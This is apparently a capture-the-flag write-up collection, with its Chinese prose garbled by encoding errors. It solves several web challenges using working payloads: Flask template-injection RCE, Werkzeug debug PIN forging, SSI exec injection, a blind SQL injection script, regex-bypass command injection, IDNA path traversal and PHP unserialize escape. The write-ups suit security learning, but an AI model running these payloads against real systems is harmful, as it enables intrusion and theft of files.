passwordçš„md5hashè¦æ˜¯6d0bc1,å†™è„šæœ¬çˆ†ç ´\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import hashlib import threading string=\u0026#39;0123456789\u0026#39; class BF(threading.Thread): def __init__(self,left,right): threading.Thread.__init__(self) self.left=left self.right=right def run(self): admin=\u0026#39;6d0bc1\u0026#39; for i in range(self.left,self.right): s=hashlib.md5(str(i).encode(\u0026#39;utf8\u0026#39;)).hexdigest() if s[:6]==admin: print(i) threads=[] thread_count=5 for i in range(thread_count): threads.append(BF(i*2000000,(i+1)*2000000)) for t in threads: t.start() t.join() 2020666 2305004 9162671\nç™»å…¥æˆåŠŸåä¼šåœ¨publicè·¯ç”±ä¸‹é¢å†™å…¥shtmlæ–‡ä»¶\næ¥ä¸‹æ¥å°±ç”¨åˆ°\nApache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆSSIæ³¨å…¥æ¼æ´ï¼‰ å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtmlï¼Œåˆ©ç”¨\u0026lt;!--#exec cmd=\u0026quot;ls /\u0026quot; --\u0026gt;è¯­æ³•æ¥æ‰§è¡Œå‘½ä»¤ã€‚\nä½¿ç”¨SSI(Server Side Include)çš„htmlæ–‡ä»¶æ‰©å±•åï¼ŒSSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸º\u0026quot;æœåŠ¡å™¨ç«¯åµŒå…¥\u0026quot;æˆ–è€…å«\u0026quot;æœåŠ¡å™¨ç«¯åŒ…å«\u0026quot;ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚\næˆ‘ä»¬å…ˆbpæŸ¥çœ‹ä¿¡æ¯ï¼Œæ‰¾åˆ°å‰ä¸‹çš„shtmlï¼Œå›æ˜¾ç”¨æˆ·å\nå¯ä»¥åœ¨ç”¨æˆ·åå¤„æ³¨å…¥\n1 2 \u0026lt;!--#exec cmd=\u0026#34;ls ../\u0026#34; --\u0026gt; \u0026lt;!--#exec cmd=\u0026#34;cat /flag\u0026#34; --\u0026gt; è¿™é‡Œæ‰¾åˆ°flag_990c66bf85a09c664f0b6741840499b2\n[GYCTF2020]FlaskApp å…ˆç”¨éé¢„æœŸè§£\nå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼Œæˆ–è€…å€’åºè¾“å‡ºç»•è¿‡\n1 2 3 æŸ¥çœ‹app.py {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;app.py\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} è¿‡æ»¤äº†flagå’Œosç­‰å‡½æ•°å’Œå…³é”®è¯ã€‚ 1 {{\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__imp\u0026#39;+\u0026#39;ort__\u0026#39;](\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).listdir(\u0026#39;/\u0026#39;)}} 1 2 å°†å­—ç¬¦å€’è½¬è¾“å‡º {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;txt.galf_eht_si_siht/\u0026#39;[::-1],\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 1 2 å­—ç¬¦ä¸²æ‹¼æ¥ {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == \u0026#39;catch_warnings\u0026#39; %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if \u0026#39;eva\u0026#39;+\u0026#39;l\u0026#39; in b.keys() %} {{ b[\u0026#39;eva\u0026#39;+\u0026#39;l\u0026#39;](\u0026#39;__impor\u0026#39;+\u0026#39;t__\u0026#39;+\u0026#39;(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;)\u0026#39;+\u0026#39;.pope\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;(\u0026#34;cat /this_is_the_fl\u0026#39;+\u0026#39;ag.txt\u0026#34;).read()\u0026#39;) }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} é¢„æœŸè§£\npythonçš„flaskæ¨¡æ¿æ³¨å…¥debugæ¨¡å¼åˆ©ç”¨PINç è¿›è¡ŒRCE ç”ŸæˆPINçš„å…³é”®å€¼æœ‰å¦‚ä¸‹å‡ ä¸ª\n1ã€æœåŠ¡å™¨è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·åã€‚ é€šè¿‡è¯»å–/etc/passwdè·å¾— 2ã€modname ä¸€èˆ¬ä¸å˜å°±æ˜¯flask.app 3ã€getattr(app, â€œnameâ€, app.class.name)ã€‚pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlaskå€¼ä¸€èˆ¬ä¸å˜ 4ã€flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚é€šè¿‡æŠ¥é”™ä¿¡æ¯å°±ä¼šæ³„éœ²è¯¥å€¼ã€‚ 5ã€å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡æ–‡ä»¶/sys/class/net/eth0/addressè·å¾— //eth0å¤„ä¸ºå½“å‰ä½¿ç”¨çš„ç½‘å¡ 6ã€æœ€åä¸€ä¸ªå°±æ˜¯æœºå™¨çš„idã€‚ å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜åœ¨/etc/machine-idæˆ–/proc/sys/kernel/random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚å¯¹äºdockeræœºåˆ™è¯»å–/proc/self/cgroupï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„/docker/å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„id\nä¸‹é¢å¼€å§‹æ“ä½œ\né€šè¿‡éšä¾¿æŠ¥é”™å›æ˜¾app.pyä½ç½®\n1 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;app.py\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} å‘ç°waf\n1 2 **def waf(str): black_list =[\u0026amp;#34;flag\u0026amp;#34;,\u0026amp;#34;os\u0026amp;#34;,\u0026amp;#34;system\u0026amp;#34;,\u0026amp;#34;popen\u0026amp;#34;,\u0026amp;#34;import\u0026amp;#34;,\u0026amp;#34;eval\u0026amp;#34;,\u0026amp;#34;chr\u0026amp;#34;,\u0026amp;#34;request\u0026amp;#34;, \u0026amp;#34;subprocess\u0026amp;#34;,\u0026amp;#34;commands\u0026amp;#34;,\u0026amp;#34;socket\u0026amp;#34;,\u0026amp;#34;hex\u0026amp;#34;,\u0026amp;#34;base64\u0026amp;#34;,\u0026amp;#34;*\u0026amp;#34;,\u0026amp;#34;?\u0026amp;#34;]** 1 2 è¯»å–ç”¨æˆ·å {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/passwd\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} flaskweb\n1 2 å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚ {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/sys/class/net/eth0/address\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 4e:4d:bc:b8:a0:2c\n1 å°†4e4dbcb8a02cè½¬ä¸º10è¿›åˆ¶ä¸º86095785664556 1 2 è¯»å–æœºå™¨id {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/proc/self/cgroup\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} docker-513f790d4e2fc09de7be4e6c769883760f1a8090aa089d9bba99b995084759ea.scope\nä½†æ˜¯è¿™é¢˜æ˜¯buuçš„è¦è¯»linuxçš„machine_id\n1 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/machine-id\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 1408f836b0ca514d796cbf8960e45fa1\nç”Ÿæˆpinç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;flaskweb\u0026#39;# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;Flask\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/usr/local/lib/python3.7/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;86095785664556\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;1408f836b0ca514d796cbf8960e45fa1\u0026#39;# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) cookie_name = \u0026#39;__wzd\u0026#39; + h.hexdigest()[:20] num = None if num is None: h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) 238-924-850\nåœ¨æŠ¥é”™ç•Œé¢æŸ¥æ‰¾åˆ°æœ‰debugç•Œé¢ï¼Œè¾“å…¥pinç ç„¶åå°±å¯ä»¥åœ¨ç»ˆç«¯RCEäº†\n1 2 3 import os os.popen(\u0026#39;ls /\u0026#39;).read() os.popen(\u0026#39;cat /this_is_the_flag.txt\u0026#39;).read() [WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢ å¸ƒå°”ç›²æ³¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests url= \u0026#39;http://575aff7c-bbec-4a7a-8075-c9dd55f58df3.node5.buuoj.cn:81/\u0026#39; database =\u0026#34;\u0026#34; payload1 = \u0026#34;?stunum=1^(ascii(substr((select(database())),{},1))\u0026gt;{})^1\u0026#34; #åº“åä¸ºctf payload2 = \u0026#34;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctf\u0026#39;)),{},1))\u0026gt;{})^1\u0026#34;#è¡¨åä¸ºflag,score payload3 =\u0026#34;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flag\u0026#39;)),{},1))\u0026gt;{})^1\u0026#34; #åˆ—åä¸ºflag,value payload4 = \u0026#34;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))\u0026gt;{})^1\u0026#34; # for i in range(1,10000): low = 32 high = 128 mid =(low + high) // 2 while(low \u0026lt; high): # payload = payload1.format(i,mid) #æŸ¥åº“å # payload = payload2.format(i,mid) #æŸ¥è¡¨å # payload = payload3.format(i,mid) #æŸ¥åˆ—å payload = payload4.format(i,mid) #æŸ¥flag new_url = url + payload r = requests.get(new_url) print(new_url) if \u0026#34;Hi admin, your score is: 100\u0026#34; in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database) print(database) [FBCTF2019]RCEService æç¤ºç”¨jsonæ ¼å¼ï¼Œä¼ å‚æ˜¯cmd\næˆ‘ä»¬lsä¸€ä¸‹\n1 {\u0026#34;cmd\u0026#34;:\u0026#34;ls\u0026#34;} å‘ç°index.php\nä½†æ˜¯åŸæ¥é¢˜ç›®æœ‰æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php putenv(\u0026#39;PATH=/home/rceservice/jail\u0026#39;); if (isset($_REQUEST[\u0026#39;cmd\u0026#39;])) { $json = $_REQUEST[\u0026#39;cmd\u0026#39;]; if (!is_string($json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } elseif (preg_match(\u0026#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/\u0026#39;, $json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } else { echo \u0026#39;Attempting to run command:\u0026lt;br/\u0026gt;\u0026#39;; $cmd = json_decode($json, true)[\u0026#39;cmd\u0026#39;]; if ($cmd !== NULL) { system($cmd); } else { echo \u0026#39;Invalid input\u0026#39;; } echo \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } } ?\u0026gt; å› ä¸ºpreg_matchåªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é‡‡ç”¨å¤šè¡Œç»•è¿‡ã€‚ å› ä¸ºputenv('PATH=/home/rceservice/jail');ä¿®æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„ä½¿ç”¨catå‘½ä»¤ï¼Œcatå‘½ä»¤åœ¨/binæ–‡ä»¶å¤¹ä¸‹\n1 2 3 ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;/usr/bin/find / -name flag*\u0026#34;%0A} ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;ls /home/rceservice\u0026#34;%0A} ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat /home/rceservice/flag\u0026#34;%0A} å…³äºpreg_matchï¼Œæœ‰pç¥æ›¾ç»è®²çš„PRCE\n1 2 3 4 5 6 7 8 import requests url=\u0026#39;http://d5e835b5-ec7b-41b3-b1f3-8973c7ac6f60.node5.buuoj.cn:81/\u0026#39; data={ \u0026#39;cmd\u0026#39;:\u0026#39;{\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat /home/rceservice/flag\u0026#34;,\u0026#34;haha\u0026#34;:\u0026#34;\u0026#39;+\u0026#39;a\u0026#39;*1000000+\u0026#39;\u0026#34;}\u0026#39; } r=requests.post(url=url,data=data).text print(r) [SUCTF 2019]Pythonginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @app.route(\u0026#39;/getUrl\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def getUrl(): url = request.args.get(\u0026#34;url\u0026#34;) host = parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;æˆ‘æ‰Œ your problem? 111\u0026#34; parts = list(urlsplit(url)) host = parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;æˆ‘æ‰Œ your problem? 222 \u0026#34; + host newhost = [] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1] = \u0026#39;.\u0026#39;.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host = parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return urllib.request.urlopen(finalUrl).read() else: return \u0026#34;æˆ‘æ‰Œ your problem? 333\u0026#34; ä»ä»£ç ä¸Šçœ‹ï¼Œæˆ‘ä»¬éœ€è¦æäº¤ä¸€ä¸ªurlï¼Œç”¨æ¥è¯»å–æœåŠ¡å™¨ç«¯ä»»æ„æ–‡ä»¶\nç®€å•æ¥è¯´ï¼Œéœ€è¦é€ƒè„±å‰ä¸¤ä¸ªifï¼ŒæˆåŠŸè¿›å…¥ç¬¬ä¸‰ä¸ªifã€‚\nè€Œä¸‰ä¸ªifä¸­åˆ¤æ–­æ¡ä»¶éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰çš„hostæ„é€ å´æ˜¯ä¸åŒçš„ï¼Œè¿™ä¹Ÿæ˜¯blackhatè¯¥è®®é¢˜ä¸­æƒ³è¦è¯´æ˜çš„ä¸€ç‚¹\nå½“URL ä¸­å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œè¾“å‡ºçš„ç»“æœå¯èƒ½ä¸åœ¨é¢„æœŸ\næˆ–è€…ç”¨%ç»•è¿‡\n1 U:â„† A:c/u ascii:8454 ï¼Œå› ä¸ºâ„†ç»è¿‡ç¼–ç è§£ç åå°±æ˜¯c/uï¼Œè¿™å’Œæˆ‘ä»¬æƒ³è¦çš„file://suctf.cc/usr/local/nginx/conf/nginx.confï¼Œåˆšå¥½â„†å¯ä»¥æ›¿ä»£c/u æ¥ç€æˆ‘ä»¬åªéœ€è¦æŒ‰ç…§getUrlå‡½æ•°å†™å‡ºçˆ†ç ´è„šæœ¬å³å¯å¾—åˆ°æˆ‘ä»¬èƒ½å¤Ÿé€ƒé€¸çš„æ„é€ è¯­å¥äº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from urllib.parse import urlparse,urlunsplit,urlsplit from urllib import parse def get_unicode(): for x in range(65536): uni=chr(x) url=\u0026#34;http://suctf.c{}\u0026#34;.format(uni) try: if getUrl(url): print(\u0026#34;str: \u0026#34;+uni+\u0026#39; unicode: \\\\u\u0026#39;+str(hex(x))[2:]) except: pass def getUrl(url): url=url host=parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return False parts=list(urlsplit(url)) host=parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return False newhost=[] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1]=\u0026#39;.\u0026#39;.join(newhost) finalUrl=urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host=parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return True else: return False if __name__==\u0026#39;__main__\u0026#39;: get_unicode() å…ˆurlç¼–ç ï¼Œå†ä¼ å‚\n1 /getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd æ ¹æ®é¢˜ç›®çš„æç¤ºå¾—çŸ¥ï¼Œè¿™é‡Œå­˜æœ‰nginxæœåŠ¡è´´ä¸Šå¦å¤–éƒ¨åˆ†nginxçš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®\n1 2 3 4 5 6 7 8 é…ç½®æ–‡ä»¶ï¼š /usr/local/nginx/conf/nginx.conf é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service æ¨¡å—ï¼š/usr/lisb64/nginx/modules åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx 1 /getUrl?url=file://suctf.câ„‚/../../../../../usr/local/nginx/conf/nginx.conf æ‰¾åˆ°flagæ‰€åœ¨ä½ç½®\n1 /getUrl?url=file://suctf.câ„‚/../../../../../usr/fffffflag [0CTF 2016]piapiapia ç›®å½•æ‰«ææœ‰www.zip\nä¸‹è½½æºç å‘ç°æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œè¦è¯»å–config.phpæ¥è·å¾—flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 if($_POST[\u0026#39;phone\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;email\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;nickname\u0026#39;] \u0026amp;\u0026amp; $_FILES[\u0026#39;photo\u0026#39;]) { $username = $_SESSION[\u0026#39;username\u0026#39;]; if(!preg_match(\u0026#39;/^\\d{11}$/\u0026#39;, $_POST[\u0026#39;phone\u0026#39;])) die(\u0026#39;Invalid phone\u0026#39;); if(!preg_match(\u0026#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/\u0026#39;, $_POST[\u0026#39;email\u0026#39;])) die(\u0026#39;Invalid email\u0026#39;); if(preg_match(\u0026#39;/[^a-zA-Z0-9_]/\u0026#39;, $_POST[\u0026#39;nickname\u0026#39;]) || strlen($_POST[\u0026#39;nickname\u0026#39;]) \u0026gt; 10) die(\u0026#39;Invalid nickname\u0026#39;); $file = $_FILES[\u0026#39;photo\u0026#39;]; if($file[\u0026#39;size\u0026#39;] \u0026lt; 5 or $file[\u0026#39;size\u0026#39;] \u0026gt; 1000000) die(\u0026#39;Photo size error\u0026#39;); move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;])); $profile[\u0026#39;phone\u0026#39;] = $_POST[\u0026#39;phone\u0026#39;]; $profile[\u0026#39;email\u0026#39;] = $_POST[\u0026#39;email\u0026#39;]; $profile[\u0026#39;nickname\u0026#39;] = $_POST[\u0026#39;nickname\u0026#39;]; $profile[\u0026#39;photo\u0026#39;] = \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;]); $user-\u0026gt;update_profile($username, serialize($profile)); echo \u0026#39;Update Profile Success!\u0026lt;a href=\u0026#34;profile.php\u0026#34;\u0026gt;Your Profile\u0026lt;/a\u0026gt;\u0026#39;; } 1 2 3 4 5 6 7 8 9 if($profile == null) { header(\u0026#39;Location: update.php\u0026#39;); } else { $profile = unserialize($profile); $phone = $profile[\u0026#39;phone\u0026#39;]; $email = $profile[\u0026#39;email\u0026#39;]; $nickname = $profile[\u0026#39;nickname\u0026#39;]; $photo = base64_encode(file_get_contents($profile[\u0026#39;photo\u0026#39;])); 1 2 3 4 5 6 7 8 9 public function filter($string) { $escape = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;); $escape = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $escape) . \u0026#39;/\u0026#39;; $string = preg_replace($escape, \u0026#39;_\u0026#39;, $string); $safe = array(\u0026#39;select\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;where\u0026#39;); $safe = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $safe) . \u0026#39;/i\u0026#39;; return preg_replace($safe, \u0026#39;hacker\u0026#39;, $string); } è¿™é‡Œåˆ©ç”¨è¿™ä¸ªè¿‡æ»¤å™¨æ¥ç»•è¿‡ï¼Œå‚è€ƒå‰é¢çš„phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸\nåœ¨nicknameçš„ä½ç½®å†™å…¥å¤§é‡çš„é»‘åå•ä½¿å¾—è¢«æ›¿æ¢ï¼Œç„¶åå°±èƒ½åŒ¹é…åé¢ä¼ªé€ çš„photoå€¼ï¼Œè¯»å–config.php\nè¿™é‡Œæˆ‘ä»¬è¦ä¼ªé€ çš„photoä¸º\n1 \u0026#34;;s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} ä½†æ˜¯å› ä¸ºå‰é¢çš„nicknameæœ‰é•¿åº¦é™åˆ¶è¦ç”¨æ•°ç»„ç»•è¿‡\nå› ä¸ºå°†nicknameæ”¹ä¸ºæ•°ç»„æ—¶ï¼Œå®ƒåœ¨åºåˆ—åŒ–æ—¶ä¸ä¼šåƒå­—ç¬¦ä¸€æ ·é—­åˆï¼Œæ‰€ä»¥è¦åŠ å¤šä¸€ä¸ª}ã€‚\n1 \u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 1 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} æ”¾åŒ…ä¹‹åï¼ŒæŠŠå›¾ç‰‡çš„base64è§£ç å‡ºæ¥å°±è¡Œäº†\n[Zer0pts2020]Can you guess it? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php include \u0026#39;config.php\u0026#39;; // FLAG is defined in config.php if (preg_match(\u0026#39;/config\\.php\\/*$/i\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;])) { exit(\u0026#34;I don\u0026#39;t know what you are thinking, but I won\u0026#39;t let you read it :)\u0026#34;); } if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST[\u0026#39;guess\u0026#39;])) { $guess = (string) $_POST[\u0026#39;guess\u0026#39;]; if (hash_equals($secret, $guess)) { $message = \u0026#39;Congratulations! The flag is: \u0026#39; . FLAG; } else { $message = \u0026#39;Wrong.\u0026#39;; } } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Can you guess it?\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Can you guess it?\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If your guess is correct, I\u0026#39;ll give you the flag.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;?source\u0026#34;\u0026gt;Source\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php if (isset($message)) { ?\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?= $message ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;guess\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä¸‹é¢é‚£ä¸ªhashåŒ¹é…éšæœºæ•°è‚¯å®šä¸è¡Œï¼Œç”¨ä¸Šé¢çš„basenameçš„bugç»•è¿‡\nPHP :: Bug #62119 :: basename broken with non-ASCII-chars\nå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š\n1 2 var_dump(basename(\u0026#34;xffconfig.php\u0026#34;)); // =\u0026gt; config.php var_dump(basename(\u0026#34;config.php/xff\u0026#34;)); // =\u0026gt; config.php è¿™æ ·å°±èƒ½ç»•è¿‡åŒ¹é…ï¼Œç”¨config.php/%ff\nå› ä¸ºbasenameå‡½æ•°çš„ç‰¹æ€§ï¼Œå®ƒä¼šè¿”å›æ–‡ä»¶å\n$_SERVER['PHP_SELF']ä¼šè·å–æˆ‘ä»¬å½“å‰çš„è®¿é—®è·¯å¾„,æˆ‘ä»¬æ„é€ index.php/config.php,å°±ä¼šè¿”å›config.php\næœ€åè®¿é—®sourceå¾—åˆ°flag\n1 